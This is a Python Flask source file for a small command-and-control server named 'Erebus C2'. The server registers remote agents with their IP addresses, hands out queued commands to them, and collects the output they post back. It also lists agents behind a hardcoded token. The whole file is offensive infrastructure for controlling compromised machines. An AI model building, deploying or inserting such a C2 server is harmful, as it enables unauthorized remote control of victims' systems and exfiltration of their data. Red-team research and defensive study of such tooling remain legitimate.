from flask import Flask
import random
from flask import Flask, request
import shared
from flask import jsonify

app = Flask(__name__)

agents = {}

def randomuuid():
    int1 = random.randint(1, 9999)
    if int1 < 10:
        int1 = "000" + str(int1)
    elif int1 < 100:
        int1 = "00" + str(int1)
    elif int1 < 1000:
        int1 = "0" + str(int1)

    int2 = random.randint(1, 9999)
    if int2 < 10:
        int2 = "000" + str(int2)
    elif int2 < 100:
        int2 = "00" + str(int2)
    elif int2 < 1000:
        int2 = "0" + str(int2)

    int3 = random.randint(1, 9999)
    if int3 < 10:
        int3 = "000" + str(int3)
    elif int3 < 100:
        int3 = "00" + str(int3)
    elif int3 < 1000:
        int3 = "0" + str(int3)

    int4 = random.randint(1, 9999)
    if int4 < 10:
        int4 = "000" + str(int4)
    elif int4 < 100:
        int4 = "00" + str(int4)
    elif int4 < 1000:
        int4 = "0" + str(int4)

    int_random = str(int1) + "-" + str(int2) + "-" + str(int3) + "-" + str(int4)
    return int_random

@app.route("/")
def index():
    return "Erebus C2 is Online !"

@app.route("/agent/register")
def register():
    guid = randomuuid()
    if guid not in agents:
        agents[guid] = {
        "ip": request.remote_addr }
        return guid
    else:
        return "Agent is already registered"

@app.route("/agent/<agent_guid>")
def agent(agent_guid):
    if agent_guid not in agents:
        return "No such agent"
    else: return "Agent is registered"

@app.route("/agent/<agent_guid>/command")
def command(agent_guid):

    cmd = shared.read_command()

    if agent_guid not in agents:
        return "No such agent"
    elif cmd  == None:
        return "No command set"
    else:
        shared.delete_command()
        return cmd

@app.route("/agent/<agent_guid>/output", methods=["GET", "POST"])
def output(agent_guid):
    if agent_guid not in agents:
        return "No such agent"

    if request.method == "POST":
        data = request.get_data(as_text=True)
        agents[agent_guid]["output"] = data + "\n"
        #agents[agent_guid]["output"] = agents[agent_guid].get("output", "") + data + "\n"
        return "OK"

    elif request.method == "GET":
        return agents[agent_guid].get("output", "No output yet")

@app.route("/agent/list")
def list_agents():
    auth_header = request.headers.get("X-Auth-ID")
    if not auth_header:
        return "Validation failed"
    if auth_header != "MyErebusToken":
        return "Validation failed"
    else:
        return jsonify(agents)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
